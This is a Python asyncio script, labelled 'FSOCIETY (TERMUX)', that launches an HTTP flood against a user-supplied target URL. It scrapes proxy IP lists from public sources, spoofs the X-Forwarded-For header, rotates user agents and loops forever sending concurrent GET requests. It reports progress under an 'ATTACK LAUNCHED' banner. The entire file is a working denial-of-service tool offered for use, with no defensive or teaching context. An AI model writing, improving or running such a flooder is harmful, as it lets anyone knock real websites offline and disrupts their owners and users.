import sys
import asyncio
import aiohttp
import random
import re
import itertools

# conf
UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

ip_list_urls = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
]


request_count = 0

async def fetch_ips():
    print("[*] proxy...")
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in ip_list_urls:
            tasks.append(session.get(url, timeout=10))
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        ips = []
        for resp in responses:
            if hasattr(resp, 'text'):
                text = await resp.text()
                ips.extend(re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text))
        return list(set(ips))

async def fire(session, target, proxy, sem):
    global request_count
    async with sem:
        headers = {
            "User-Agent": random.choice(UserAgents),
            "X-Forwarded-For": proxy,
            "Connection": "keep-alive"
        }
        try:
            async with session.get(target, headers=headers, timeout=4) as resp:
                request_count += 1
                if request_count % 100 == 0:
                    print(f"[*] Send: {request_count} requests | Status: {resp.status}", end='\r')
        except:
            pass

async def attack(target, concurrency):
    ips = await fetch_ips()
    if not ips:
        print("[!] No proxies")
        ips = ["1.1.1.1"]

    ip_cycle = itertools.cycle(ips)
    sem = asyncio.Semaphore(concurrency)


    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, use_dns_cache=True)

    async with aiohttp.ClientSession(connector=conn) as session:
        print(f"\n[!] ATTACK LAUNCHED: {target}")
        print("[!] Power: " + str(concurrency) + " connections ")


        while True:
            tasks = []
            for _ in range(concurrency):
                tasks.append(fire(session, target, next(ip_cycle), sem))
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("=== FSOCIETY (TERMUX) ===")
    target = input("Target URL: ")
    if not target.startswith("http"): target = "http://" + target


    try:
        power = int(input("Power (threads, recommended 500-1000): "))
        asyncio.run(attack(target, power))
    except KeyboardInterrupt:
        print(f"\n\n[*] Total send: {request_count}")
        print("[!] Quitting..")
